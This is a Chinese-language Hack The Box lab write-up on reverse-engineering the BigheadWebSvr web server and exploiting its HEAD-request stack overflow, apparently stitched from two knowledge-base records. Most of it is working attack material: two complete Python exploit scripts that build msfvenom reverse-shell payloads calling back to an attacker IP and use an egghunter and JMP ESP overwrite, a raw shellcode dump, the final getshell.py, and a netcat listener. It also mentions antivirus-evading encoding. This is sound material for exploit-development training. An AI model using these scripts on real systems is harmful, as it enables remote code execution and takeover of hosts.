向上滚动到函数的顶部，查看它的名称是由IDA指定的_ConnectionHandler@4。

#### step2

或者，当IDA加载时，它从main启动。知道这是一个网络服务器。所以它很可能会创建一个套接字，将其绑定到post，监听，等待连接，通过分叉(在Windows中是启动一个线程)处理那些连接。看到这个函数的整体流程是这样的:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida4.jpg)

甚至不需要查看程序集，就可以猜测发生了什么。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida5.jpg)

如果滚动代码本身，看看被调用的函数，发现基本上是对的。还注意到，在处理了arg之后，它会打印一条带有服务器版本的消息，并警告该软件是存在漏洞的:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida6.jpg)

如果跳到上面的绿色部分，将看到处理连接的代码和创建一个线程来处理连接的调用:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida7.jpg)

线程将偏移量传递给_ConnectionHander@4作为要运行的代码。

#### step3

也有可能，只是看看函数窗口，看到名称IDA给出的函数，并猜测这是处理连接:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida8.jpg)

 - 处理程序逻辑

现在有了处理程序逻辑，尝试理解它。就像使用main一样，从函数的形状开始，看看能不能猜出发生了什么:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida9.jpg)

立即看到一堆比较(if语句)，末尾有一堆块。猜所有这些if语句都是基于成功/失败或recv，然后传入HTTP请求的不同属性(GET vs POST，文件存在，等等)进行分支。

从顶部开始，可以快速浏览并获得逻辑。并不是试图去理解每一个配置，而只是寻找一个生成的想法，即什么是分支，什么是可以排除的有趣的东西。以下是在上面看到的流的注释版本:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida10.jpg)

 - (a)设置两个缓冲区并将其设置为0。如果某个错误代码为-1，则打印(b)处的错误并返回(c)处的错误。
 - (d)检查最后一个memset返回ok，否则返回(c)。
 - (e)在第一个缓冲区中recv到0x20c(524)字节，并检查返回代码。如果0或错误(负)，跳转到(f)。在(f)，如果recv返回0，转到(g)，打印“连接关闭”，关闭套接字，并转到(c)返回。否则，转到(h)，打印接收错误值，关闭套接字，然后转到(c)返回。
 - 检查在(i)处接收的数据的长度。如果它小于0xdb(219)字节，转到(j)，否则转到(k)。
 - 在(j)处，检查请求的前五个字节是否为“HEAD”。如果是这样，请进入用绿色标记的部分。否则，转到(k)。
 - 在(k)，现在处理所有的请求，除了一个低于219字节的头，检查请求以6个字节开始，“GET /”(在“/”后面有空格)。如果是这样，转到(l)，发送带有拿着饮料的人的图像的响应，清理干净，然后返回到(c)。否则，转到(m)。
 - 在(m)处，检查请求是否以“GET /coffee”开始。如果匹配，将418响应与teapot gif发送到(n)，然后清理并返回到(c)。这就解释了为什么dirsearch为/coffee、/coffeecat、/coffeebreak和/coffeecup返回相同的结果。否则，转到(o)。
 - 在(o)处，检查申请是否以“POST /”开头。如果是这样，转到(p)和(l)完全一样，发送给那个带着饮料图像的人。否则，转到(q)并发送404消息，清除，并返回到(c)。

很快，就排除了上述流程中的任何风险。

 - 短head请求

其余的代码(上面绿色的部分)在HEAD请求长度小于219字节时调用。只是浏览一下，试图从更高的层面了解它在做什么:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida11.jpg)

 - 在(a)处，从原始初始化开始的第二个缓冲区的三个字节被设置为0。然后，创建一个新的12字节缓冲区。最后，初始化两个计数器(EBP-C和EPB-10)。把它们称为I和j I被设为6，而j为0。

 - 现在在(b)中，它是循环的顶部。进入请求的字节i字节将被加载，如果为空，循环将跳转到(e)。否则，继续跳转到(c)，其中i+1字节进入请求，如果为空，循环跳转到(e)。否则，继续跳转到(d)。

 - (d)有一堆事情:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida12.jpg)

因此，它将每两个字节从十六进制转换为一个字节值，并将其存储在堆的缓冲区中。然后它回到这个局部循环的顶部。

 - 这里有一个堆溢出，因为可以写远超过错误定位的12字节。检查这个循环完成后会发生什么，在(e)中。

 - 首先，它调用_Function4，将新的未十六进制数组作为参数传递。然后它向guy和drink图像发送相同的200 OK，并向控制台打印一些消息。然后转到(f)，检查发送的返回代码。如果-1(错误)，它转到(g)，打印更多错误，清理并返回。否则，它将返回循环的顶部并尝试读取更多内容。

快速浏览Function4:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida13.jpg)

基本上是从I控制的缓冲区执行一个不安全的strcpy到堆栈上的一个地址。这是一个覆盖函数返回指针溢出的明显例子，但现在可以避免堆溢出。

#### Final Exploit 1 (推荐，较稳定，回弹shell时间较短):

``` bash
#!/usr/bin/env python

import os
import subprocess
import sys

from pwn import *
from time import sleep

context(terminal=['tmux', 'new-window'])
context(os='windows', arch="i386")


def clean_and_exit(msg, files):
    print(msg)
    for f in files:
        try:
            os.remove(f)
        except:
            pass
    sys.exit()


if len(sys.argv) != 5:
    clean_and_exit("%s [target] [target port] [callback ip] [callback port]" % (sys.argv[0]), [])

target = sys.argv[1]
port = sys.argv[2]
cb_ip = sys.argv[3]
cb_port = sys.argv[4]

# Generate Shellcode 
msfvenom_string = 'msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s EXIT_FUNC=THREAD -a x86 --platform windows -b "\\x00\\x0a\\x0d" -f python -v shellcode -o sc.py' % (cb_ip, cb_port)
print("[*] Generating shellcode:\n    %s" % msfvenom_string)
p = subprocess.Popen(msfvenom_string.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
out, err = p.communicate()

try:
    if "Error" in err:
        raise Exception("[-] Unable to generate shellcode\n    %s" % err)
    from sc import shellcode
except (NameError, Exception) as e:
    clean_and_exit(e.message, ['sc.py', 'sc.pyc'])

print "[+] Shellcode generated successfully"
os.remove('sc.py')
os.remove('sc.pyc')

# !mona egg -t
egg = 'luci'
egghunter = "6681caff0f42526a0258cd2e3c055a74efb8" + egg.encode('hex') + "8bfaaf75eaaf75e7ffe7"

nops = "\x90"*16
spray = egg + egg + nops + shellcode
post = 'POST / HTTP/1.1\r\nHost: dev.bighead.htb\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n'.format(len(spray))
spray_payload = post + spray

head = "HEAD /"
junk = "1" * (78-len(head))
jmp_esp = "f0125062" #p32(0x625012f0)
host = " HTTP/1.1\r\nHost: dev.bighead.htb\r\n\r\n"
exec_payload = head + junk + jmp_esp + egghunter + host

print("[*] Sending payload 16 times")
for i in range(16):
    p = remote(target, port)
    #print(spray_payload)
    p.sendline(spray_payload)
    p.recv()
    p.close()
    sleep(0.1)

print("[+] Payload sent.\n[*] Sleeping 1 second.")
sleep(1)

print("[*] Sending overflow + egghunter.")
print("[*] Expect callback in 0-3 minutes to %s:%s." % (cb_ip, cb_port))
p = remote(target, port)
p.sendline(exec_payload)
sleep(1)
p.recv()
p.close()
```

 - 逐行代码解释:

``` bash
第15-48行是关于生成shellcode和清理shellcode的
第50-73行设置将发送的web请求
第65-72行发送带有shell的POST请求16次
第77-83行发送带egg hunter payload的head请求
```

#### Final Exploit 2 (回弹shell时间较长):

``` bash
#!/usr/bin/python

import sys, subprocess, requests
from requests import Request, Session

banner = (
          "[+] Useage: %s <rhost> <rport> <lhost> <lport>"%sys.argv[0]
         )
if __name__ == '__main__':
    try:
      rhost = sys.argv[1]
      rport = sys.argv[2]
      lhost = sys.argv[3]
      lport = sys.argv[4]
    except IndexError:
      print(banner)
      sys.exit(-1)

urlpath = ("http://" + rhost + ":" + str(rport) + "/")
hdrs    = {'User-Agent': 'lUc1f3r11'}
proxy   = {'http': 'http://127.0.0.1:8080'}
lstner  = ("nc -s " + lhost + " -nvlp " + str(lport))

mksh  = (# Auto Generate Reverse Shell Payload Using msfvenom
         "msfvenom -p windows/shell_reverse_tcp" +
         " -e x86/shikata_ga_nai" +
         " EXITFUNC=thread" +
         " -v RevShell" +
         " LHOST=" + lhost +
         " LPORT=" + lport +
         " -f python" +
         " -a x86" +
         " -o RevPld.py"
        )

try:
    print("[+] Attempting To Generate Reverse Shell Payload ...")
    vnm = subprocess.Popen(mksh.split(), stdout=subprocess.PIPE)
    vnm.wait()
    print("[+] Reverse Shell Payload Generated Successfully...")
except:    
    print("[!] ERROR: Couldn't Generate Payload")
    sys.exit(-1)

from RevPld import RevShell

shl  = (# Prepends a string of 3mg33mg3
        ("3mg3" * 2) + 
        # Insert msfvenom revshell payload 
        RevShell       
       ) 

egh  = (# EggHunter Shellcode
        "6681CAFF0F42526A"  # 32 byte EggHunter, with egg of '3mg3'
        "0258CD2E3C055A74"  # This will scan through mem address space 
        "EFB8336D67338BFA"  # and try to match the string "3mg33mg3", 
        "AF75EAAF75E7FFE7"  # then execute the shellcode that follows it.
       )

buf  = (# Place the EggHunter at the start of the buffer.
        egh +
        # EIP Overwrite Buffer
        ("A" * ((72) - len(egh))) +  
        # 64552F19 JMP EAX 
        # From Module Name=C:\MinGW\bin\libmingwex-0.dll
        "192F5564" 
       )        

sploit = (urlpath + buf)

print("[+] Sending evil HTTP request to BigHeadWebSvr 1.0")

try: # Prepare POST content body so it won't URL Encode the shellcode data.
  s = Session()
  payload={'5h377':shl}
  r = Request('POST', urlpath, data=payload, headers=hdrs)
  prepped = r.prepare()
  prepped.body = shl
  del prepped.headers['Content-Type']
  # Send The Egg RevShell Payload as a POST Request data  
  resp = s.send(prepped, proxies=proxy, timeout=0.01)
  print(resp.status_code)
except:
  print("[+] Shell Payload Sent...")

try:
    # Send the HEAD METHOD BOF Exploit
    r = requests.head(sploit, headers=hdrs, timeout=0.01, proxies=proxy)
except:
  print("[+] Exploit Sent!")

try:
    # Start a netcat listener and wait for the incoming connection
    print("[+] Listening for reverse shell")
    ncl = subprocess.Popen(lstner, shell=True)
    ncl.poll()
    ncl.wait()
except:    
    print("\r[!] Shell Terminated!")
    exit(0)
```

此exploit生成的shellcode使用了msf的 x86/shikata_ga_nai 编码模块有一定的免杀效果。
<!-- kb:end hack-the-box-bigheadwebsvr-2 -->

</details>

<a id="case-hack-the-box-bigheadwebsvr"></a>

## 小缓冲区与 Egghunter 布局

Immunity Debugger 和 mona 确定偏移及跳转地址，有限空间由 Egghunter 搜索另一请求中的 shellcode。原文的请求拆分和重复发送策略保留。

<p class="kb-provenance">来源 hack-the-box-bigheadwebsvr · 原记录 2020-12-26 · 31 个代码块 · 9 处图片引用</p>

<details class="kb-evidence" id="record-hack-the-box-bigheadwebsvr">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start hack-the-box-bigheadwebsvr -->

 - 本文专门记录hack the box --- bighead机器的BigheadWebSvr逆向部分，故前面的部分省略，part1 主要使用的工具是immunity debugger和mona插件，下一篇part2主要使用IDA来分析程序。



#### step1

把zip压缩文件从github上下载下来之后，john跑hash出来密码，然后解压出来，运行。

 - <font color="red">运行BigheadWebSvr.exe出现找不到libmingwex-0.dll，直接网上google搜索下载libmingwex-0.dll即可。。。</font>

使用下面命令找出程序是开放在8008端口上的

``` bash
C:\Users\Administrator>netstat -ano
TCP    0.0.0.0:8008           0.0.0.0:0              LISTENING       23076
```

使用immunity debugger打开BigheadWebSvr.exe，然后点击运行，然后使用burp抓包，然后想办法构造poc使程序崩溃，如下图,EIP寄存器已被AAAAAAAA所填满:

``` bash
curl --head http://172.20.10.7:8008/$(python -c 'print(("A"*100))')
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadwebsvr.jpg)

尝试发送一个更大的请求，服务器没有崩溃，有一个小问题，因为被限制在一个特定的大小，没有足够的空间来存储shellcode，这就是为什么需要使用egghunting。有很多关于win32 egghenting的很棒的教程，所以说明一个概念什么是egghunting，以防不清楚。当没有足够的堆栈空间来保存shellcode时，发送一个非常小的字符串，称为egghunter，而不是发送和执行shellcode。当egghunter被执行时，它会在整个内存中搜索一个egg。当它碰到egg时，它会执行它后面的代码(shellcode)。egg是一个4字节的字符串，例如luci，该egg被翻倍并添加到shellcode之前，如下所示:luciluci + shellcode。在skape的论文[安全搜索进程虚拟地址空间](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)中对此做了很好的解释。也有很多实用教程只是搜索win32 egghunting。

现在回到易受攻击的服务器，首先需要知道的是偏移量。使用[mona插件](https://github.com/corelan/mona), [插件文档使用说明](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)。

 - 设置mona日志输出路径

``` bash
!mona config -set workingfolder D:\1.pentesttool\mona-master\logs\%p
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadwebsvr1.jpg)

为了找到偏移量需要创建一个识别模板，创建100个字符的识别模板，这和使用metasploit的pattern_create.rb创建识别模板的方法是一样的

``` bash
!mona pc 100
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadwebsvr2.jpg)

会在之前设置的:

D:\1.pentesttool\mona-master\logs\BigheadWebSvr

目录输出一个pattern.txt文件，复制里面的ASCII值:

``` bash
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

然后发送下面请求:

``` bash
curl --head http://172.20.10.7:8008/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadwebsvr3.jpg)

这个EIP被ACC54AAC覆盖了，mona findmsp 会找出偏移量，但由于某些原因它无法找到它，所以手动找它。颠倒ACC54AAC，因为它是小端序，所以颠倒过来后是AC4AC5AC。定位它，然后使用python的函数len()找到AC4AC5AC之前的字符串长度:

``` bash
>>> len("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3")
72
```

偏移量是72, 现在来确认下. 发送72个A然后8个B:

``` bash
curl --head http://172.20.10.7:8008/$(python -c 'print(("A"*72)+("B"*8))')
```
 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadwebsvr4.jpg)

成功的使用B覆盖了EIP

很好，现在控制了EIP，现在需要找到一个真正的地址来覆盖EIP。由于egghunter将位于堆栈上，需要找到一个jmp esp指令，使它成为egghunter的jmp并执行它。为了做到这一点，使用mona插件。

``` bash
!mona jmp -r ESP
```

它将在D:\1.pentesttool\mona-master\logs\BigheadWebSvr中创建另一个名为jmp.txt的文件。需要确保选择的地址能在目标机器上工作，因此使用了来自服务器本身的dll bHeadSvr.dll中的一个地址。选择第一个:

``` bash
0x625012f0 : jmp esp |  {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\hack the box°Ð»úÉøÍ¸\doing\machine\BigHead\BHWS_Backup\BHWS_Backup\bHeadSvr.dll)
0x625012fd : jmp esp |  {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\hack the box°Ð»úÉøÍ¸\doing\machine\BigHead\BHWS_Backup\BHWS_Backup\bHeadSvr.dll)
```

现在发送一个请求测试它，72个A和f0125062, 即625012f0的倒转:

``` bash
curl --head http://172.20.10.7:8008/$(python -c 'print(("A"*72)+("f0125062"))')
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadwebsvr5.jpg)

运行的很正常。需要知道的最后一件事是如何发送shellcode。发送了一个POST请求，看看服务器如何处理它，只是一堆A:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadwebsvr6.jpg)

然后搜索内存:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadwebsvr7.jpg)

现在可以看到整个请求被打印在内存中，利用这个信息来写利用程序exploit

#### step2

首先import socket, binary和re模块

``` bash
import socket
import binascii
import re
```

然后开始定义变量，需要变量来保存host、port、egg、shellcode和egghunter。先生成shellcode:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/bighead]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=1337 -b '\x00' -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
buf =  b""
buf += b"\xda\xc6\xbf\xb6\xed\x8f\x35\xd9\x74\x24\xf4\x5a\x29"
buf += b"\xc9\xb1\x52\x83\xc2\x04\x31\x7a\x13\x03\xcc\xfe\x6d"
buf += b"\xc0\xcc\xe9\xf0\x2b\x2c\xea\x94\xa2\xc9\xdb\x94\xd1"
buf += b"\x9a\x4c\x25\x91\xce\x60\xce\xf7\xfa\xf3\xa2\xdf\x0d"
buf += b"\xb3\x09\x06\x20\x44\x21\x7a\x23\xc6\x38\xaf\x83\xf7"
buf += b"\xf2\xa2\xc2\x30\xee\x4f\x96\xe9\x64\xfd\x06\x9d\x31"
buf += b"\x3e\xad\xed\xd4\x46\x52\xa5\xd7\x67\xc5\xbd\x81\xa7"
buf += b"\xe4\x12\xba\xe1\xfe\x77\x87\xb8\x75\x43\x73\x3b\x5f"
buf += b"\x9d\x7c\x90\x9e\x11\x8f\xe8\xe7\x96\x70\x9f\x11\xe5"
buf += b"\x0d\x98\xe6\x97\xc9\x2d\xfc\x30\x99\x96\xd8\xc1\x4e"
buf += b"\x40\xab\xce\x3b\x06\xf3\xd2\xba\xcb\x88\xef\x37\xea"
buf += b"\x5e\x66\x03\xc9\x7a\x22\xd7\x70\xdb\x8e\xb6\x8d\x3b"
buf += b"\x71\x66\x28\x30\x9c\x73\x41\x1b\xc9\xb0\x68\xa3\x09"
buf += b"\xdf\xfb\xd0\x3b\x40\x50\x7e\x70\x09\x7e\x79\x77\x20"
buf += b"\xc6\x15\x86\xcb\x37\x3c\x4d\x9f\x67\x56\x64\xa0\xe3"
buf += b"\xa6\x89\x75\xa3\xf6\x25\x26\x04\xa6\x85\x96\xec\xac"
buf += b"\x09\xc8\x0d\xcf\xc3\x61\xa7\x2a\x84\x87\x32\x3a\x56"
buf += b"\xf0\x40\x42\x53\x39\xcc\xa4\x31\x29\x98\x7f\xae\xd0"
buf += b"\x81\x0b\x4f\x1c\x1c\x76\x4f\x96\x93\x87\x1e\x5f\xd9"
buf += b"\x9b\xf7\xaf\x94\xc1\x5e\xaf\x02\x6d\x3c\x22\xc9\x6d"
buf += b"\x4b\x5f\x46\x3a\x1c\x91\x9f\xae\xb0\x88\x09\xcc\x48"
buf += b"\x4c\x71\x54\x97\xad\x7c\x55\x5a\x89\x5a\x45\xa2\x12"
buf += b"\xe7\x31\x7a\x45\xb1\xef\x3c\x3f\x73\x59\x97\xec\xdd"
buf += b"\x0d\x6e\xdf\xdd\x4b\x6f\x0a\xa8\xb3\xde\xe3\xed\xcc"
buf += b"\xef\x63\xfa\xb5\x0d\x14\x05\x6c\x96\x24\x4c\x2c\xbf"
buf += b"\xac\x09\xa5\xfd\xb0\xa9\x10\xc1\xcc\x29\x90\xba\x2a"
buf += b"\x31\xd1\xbf\x77\xf5\x0a\xb2\xe8\x90\x2c\x61\x08\xb1"
```

-b '\x00' 代表坏字符。\x00 是一个空字节总是一个坏字符，因为它充当一个字符串结束符并终止执行，所以不需要在shellcode中使用它。把这个添加到漏洞中并删除所有的"\x"，因为从binascii中使用hexlify和unhexlify函数。这是shellcode，现在需要egghunter。使用这个[工具](https://github.com/ihack4falafel/OSCE/blob/master/Tools/EggHunter.py)来生成egghunter:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/bighead]
└─# python EggHunter.py luci
[+] Egg Hunter shellcode with egg of 'luci'..
Final Opcode    : 6681caff0f42526a0258cd2e3c055a74efb86963756c8bfaaf75eaaf75e7ffe7
Final Shellcode : '\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x69\x63\x75\x6c\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7'
```

但如果想改变egg，应该生成一个新的，看这工具是如何做的:

``` bash
FinalOpcode = "6681caff0f42526a0258cd2e3c055a74efb8" +M+ OpCode +W+ "8bfaaf75eaaf75e7ffe7"
```

可以很容易地将其添加到exploi本身中。

``` bash
host = '10.10.10.112'
port = 80
egg = 'luci'
```

host用于机器的ip, port用于端口，egg用于保存egg的值。之后是由msfvenom生成的buf变量(这是shellcode，你应该用自己的ip和监听端口生成一个新的):

``` bash
buf =  b""
buf += b"dac6bfb6ed8f35d97424f45a29"
buf += b"c9b15283c204317a1303ccfe6d"
buf += b"c0cce9f02b2cea94a2c9db94d1"
buf += b"9a4c2591ce60cef7faf3a2df0d"
buf += b"b309062044217a23c638af83f7"
buf += b"f2a2c230ee4f96e964fd069d31"
buf += b"3eadedd44652a5d767c5bd81a7"
buf += b"e412bae1fe7787b87543733b5f"
buf += b"9d7c909e118fe8e796709f11e5"
buf += b"0d98e697c92dfc309996d8c14e"
buf += b"40abce3b06f3d2bacb88ef37ea"
buf += b"5e6603c97a22d770db8eb68d3b"
buf += b"716628309c73411bc9b068a309"
buf += b"dffbd03b40507e70097e797720"
buf += b"c61586cb373c4d9f675664a0e3"
buf += b"a68975a3f6252604a68596ecac"
buf += b"09c80dcfc361a72a8487323a56"
buf += b"f040425339cca43129987faed0"
buf += b"810b4f1c1c764f9693871e5fd9"
buf += b"9bf7af94c15eaf026d3c22c96d"
buf += b"4b5f463a1c919faeb08809cc48"
buf += b"4c715497ad7c555a895a45a212"
buf += b"e7317a45b1ef3c3f735997ecdd"
buf += b"0d6edfdd4b6f0aa8b3dee3edcc"
buf += b"ef63fab50d14056c96244c2cbf"
buf += b"ac09a5fdb0a910c1cc2990ba2a"
buf += b"31d1bf77f50ab2e8902c6108b1"
```

创建一个变量来保存最终的shellcode(egg*2 + shellcode)和另一个变量为egghunter:

``` bash
shellcode = (egg * 2) + binascii.unhexlify(buf)
egghunter = "6681caff0f42526a0258cd2e3c055a74efb8" + binascii.hexlify(egg) + "8bfaaf75eaaf75e7ffe7"
```

 - 注意: 有一个名为N的变量，稍后会讲到，它与漏洞本身没有关系。
现在需要创建两个函数。第一种是通过POST请求发送shellcode，另一种是利用漏洞发送egghunter。

从定义函数开始:

``` bash
def send_shellcode(N,host,port,egg,shellcode):
```

然后，打开一个TCP流套接字到服务器和端口，将它保存在一个名为s的变量中:

``` bash
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
```

最后要做的是用shellcode发送POST请求:

``` bash
s.send("POST / HTTP/1.1\r\n")
s.send("Host: dev.bighead.htb\r\n")
s.send("Content-Length: %s\r\n"%len(shellcode))
s.send("\r\n")
s.send(shellcode+"\r\n")
s.send("\r\n")
```

然后关闭流: s.close()

将它添加到一个for循环中，以发送16次shellcode。这样做是因为想把shellcode放在不同的地方，这样egghunter就可以很容易地找到它。还在函数的开头添加了一个打印语句:

``` bash
print "\033[32m [*] Sending Shellcode"
```

\033[32m 是颜色，对攻击并不重要。并且在关闭流之前添加了一个print语句:

``` bash
print '\033[34m' + '[' + str(N) + '] ' + re.sub(r"\s"," ",s.recv(12))
```

re.sub(r"\s"," ",s.recv(12))将使用re(正则表达式操作)来打印服务器响应的第一行的前12个字符("HTTP/1.1" + " " + 状态码(3个字符) = 12)。

send_shellcode:

``` bash
def send_shellcode(N,host,port,egg,shellcode):
	print "\033[32m [*] Sending Shellcode"
	for i in range(0,16):
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
		s.connect((host,port))
		s.send("POST / HTTP/1.1\r\n")
		s.send("Host: dev.bighead.htb\r\n")
		s.send("Content-Length: %s\r\n"%len(shellcode))
		s.send("\r\n")
		s.send(shellcode+"\r\n")
		s.send("\r\n")
		print '\033[34m' + '[' + str(N) + '] ' + re.sub(r"\s"," ",s.recv(12))
		s.close()
		N += 1
	print "\033[32m [*] Done"
```

这是send_shellcode，写send_egghhunter。首先定义函数:

 - def send_egghunter(host,port,egghunter):

然后，打开一个TCP流套接字到host和port，并将它保存在一个名为s的变量中:

``` bash
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
```

然后将连接并发送HEAD请求:

``` bash
s.connect((host,port))
s.settimeout(None)
s.send("HEAD /" + ("A"*72) + "f0125062" + egghunter + " HTTP/1.1\r\n")
s.send("Host: dev.bighead.htb\r\n")
s.send("\r\n")
```

设置了settimeout(None)，因为服务器需要很多时间来响应这个请求(因为将改变代码流，所以服务器不会回应)，不希望流在egghunter成功执行之前被关闭。

 - s.send("HEAD /" + ("A"*72) + "f0125062" + egghunter + " HTTP/1.1\r\n")

这一行发送72个A然后f0125062(jmp esp(新EIP))然后egghunter。

 - send_egghunter:

``` bash
def send_egghunter(host,port,egghunter):
	print "\033[32m [*] Sending EggHunter"
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
	s.connect((host,port))
	s.settimeout(None)
	s.send("HEAD /" + ("A"*72) + "f0125062" + egghunter + " HTTP/1.1\r\n")
	s.send("Host: dev.bighead.htb\r\n")
	s.send("\r\n")
	print '\033[34m' + re.sub(r"\s"," ",s.recv(12))
	s.close()
	print "\033[32m [*] Done"
```

漏洞利用脚本已经准备好了，现在只需要调用以下函数:

``` bash
send_shellcode(N,host,port,egg,shellcode)
send_egghunter(host,port,egghunter)
```

最终exploit脚本:

 - getshell.py

``` bash
#!/usr/bin/python
import socket
import binascii
import re

host = '10.10.10.112'
port = 80
egg = 'luci'

N = 0

buf =  b""
buf += b"dac6bfb6ed8f35d97424f45a29"
buf += b"c9b15283c204317a1303ccfe6d"
buf += b"c0cce9f02b2cea94a2c9db94d1"
buf += b"9a4c2591ce60cef7faf3a2df0d"
buf += b"b309062044217a23c638af83f7"
buf += b"f2a2c230ee4f96e964fd069d31"
buf += b"3eadedd44652a5d767c5bd81a7"
buf += b"e412bae1fe7787b87543733b5f"
buf += b"9d7c909e118fe8e796709f11e5"
buf += b"0d98e697c92dfc309996d8c14e"
buf += b"40abce3b06f3d2bacb88ef37ea"
buf += b"5e6603c97a22d770db8eb68d3b"
buf += b"716628309c73411bc9b068a309"
buf += b"dffbd03b40507e70097e797720"
buf += b"c61586cb373c4d9f675664a0e3"
buf += b"a68975a3f6252604a68596ecac"
buf += b"09c80dcfc361a72a8487323a56"
buf += b"f040425339cca43129987faed0"
buf += b"810b4f1c1c764f9693871e5fd9"
buf += b"9bf7af94c15eaf026d3c22c96d"
buf += b"4b5f463a1c919faeb08809cc48"
buf += b"4c715497ad7c555a895a45a212"
buf += b"e7317a45b1ef3c3f735997ecdd"
buf += b"0d6edfdd4b6f0aa8b3dee3edcc"
buf += b"ef63fab50d14056c96244c2cbf"
buf += b"ac09a5fdb0a910c1cc2990ba2a"
buf += b"31d1bf77f50ab2e8902c6108b1"

shellcode = (egg * 2) + binascii.unhexlify(buf)
egghunter = "6681caff0f42526a0258cd2e3c055a74efb8" + binascii.hexlify(egg) + "8bfaaf75eaaf75e7ffe7"

def send_shellcode(N,host,port,egg,shellcode):
	print "\033[32m [*] Sending Shellcode"
	for i in range(0,16):
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
		s.connect((host,port))
		s.send("POST / HTTP/1.1\r\n")
		s.send("Host: dev.bighead.htb\r\n")
		s.send("Content-Length: %s\r\n"%len(shellcode))
		s.send("\r\n")
		s.send(shellcode+"\r\n")
		s.send("\r\n")
		print '\033[34m' + '[' + str(N) + '] ' + re.sub(r"\s"," ",s.recv(12))
		s.close()
		N += 1
	print "\033[32m [*] Done"

def send_egghunter(host,port,egghunter):
	print "\033[32m [*] Sending EggHunter"
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
	s.connect((host,port))
	s.settimeout(None)
	s.send("HEAD /" + ("A"*72) + "f0125062" + egghunter + " HTTP/1.1\r\n")
	s.send("Host: dev.bighead.htb\r\n")
	s.send("\r\n")
	print '\033[34m' + re.sub(r"\s"," ",s.recv(12))
	s.close()
	print "\033[32m [*] Done"

send_shellcode(N,host,port,egg,shellcode)
send_egghunter(host,port,egghunter)
```

现在运行脚本看效果:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/bighead]
└─# python getshell.py 
 [*] Sending Shellcode
[0] HTTP/1.1 200
[1] HTTP/1.1 200
[2] HTTP/1.1 200
[3] HTTP/1.1 200
[4] HTTP/1.1 200
[5] HTTP/1.1 200
[6] HTTP/1.1 200
[7] HTTP/1.1 200
[8] HTTP/1.1 200
[9] HTTP/1.1 200
[10] HTTP/1.1 200
[11] HTTP/1.1 200
[12] HTTP/1.1 200
[13] HTTP/1.1 200
[14] HTTP/1.1 200
[15] HTTP/1.1 200
 [*] Done
 [*] Sending EggHunter
```

过一会儿，拿到一个reverse shell

``` bash
┌──(root💀kali)-[~]
└─# nc -lvp 1337
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
